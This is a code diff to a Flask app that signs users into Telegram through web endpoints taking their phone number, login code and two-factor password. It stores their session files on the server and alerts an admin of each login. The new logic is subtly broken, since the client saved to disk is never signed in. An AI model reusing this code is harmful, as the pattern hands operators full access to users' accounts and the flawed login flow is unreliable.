@@ -64,9 +64,7 @@ def run_async(coro):
 # phone -> {client, hash}
 pending = {}
 
-def session_path(phone):
-    return os.path.join(SESSIONS_DIR, phone.replace("+", ""))
-    
+   
 def notify_admin_login(user_id: str, phone: str, username: str | None = None):
     async def _send():
         text = (
@@ -105,7 +103,7 @@ def send_code():
     try:
         async def work():
             client = TelegramClient(
-                session_path(phone),
+                None,
                 API_ID,
                 API_HASH
             )
@@ -143,21 +141,26 @@ def verify_code():
 
     try:
         async def work():
-            client = TelegramClient(
-                session_path(phone),
-                API_ID,
-                API_HASH
-            )
-            await client.connect()
+            # 1️⃣ vaqtinchalik client
+            temp_client = TelegramClient(None, API_ID, API_HASH)
+            await temp_client.connect()
 
-            await client.sign_in(
+            await temp_client.sign_in(
                 phone=phone,
                 code=code,
                 phone_code_hash=phone_hash
             )
 
-            me = await client.get_me()
+            me = await temp_client.get_me()
+
+            # 2️⃣ ASOSIY session — user_id bilan
+            session_file = os.path.join(SESSIONS_DIR, str(me.id))
+            client = TelegramClient(session_file, API_ID, API_HASH)
+            await client.connect()
+
+            await temp_client.disconnect()
             await client.disconnect()
+
             return me
 
         me = run_async(work())
@@ -171,7 +174,6 @@ def verify_code():
             INSERT INTO subscriptions (user_id, status)
             VALUES (%s, 'trial')
             ON CONFLICT (user_id) DO NOTHING
-
         """, (user_id,))
         conn.commit()
         conn.close()
@@ -181,7 +183,7 @@ def verify_code():
             phone=phone,
             username=getattr(me, "username", None)
         )
-        
+
         return jsonify({"status": "success"})
 
     except SessionPasswordNeededError:
@@ -201,22 +203,24 @@ def verify_password():
 
     try:
         async def work():
-            client = TelegramClient(
-                session_path(phone),
-                API_ID,
-                API_HASH
-            )
+            temp_client = TelegramClient(None, API_ID, API_HASH)
+            await temp_client.connect()
+
+            await temp_client.sign_in(password=password)
+            me = await temp_client.get_me()
+
+            session_file = os.path.join(SESSIONS_DIR, str(me.id))
+            client = TelegramClient(session_file, API_ID, API_HASH)
             await client.connect()
 
-            await client.sign_in(password=password)
-
-            me = await client.get_me()
+            await temp_client.disconnect()
             await client.disconnect()
+
             return me
 
         me = run_async(work())
 
-        # 🔽 DB GA YOZISH (ENG MUHIM JOY)
+        # 🔽 authorized_users ga yozamiz
         user_id = str(me.id)
         conn = get_db()
         cur = conn.cursor()
@@ -235,7 +239,7 @@ def verify_password():
             phone=phone,
             username=getattr(me, "username", None)
         )
-        
+
         return jsonify({"status": "success"})
 
     except Exception as e:
@@ -267,6 +271,7 @@ def notify_admin(user_id: str, phone: str, username: str | None = None):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
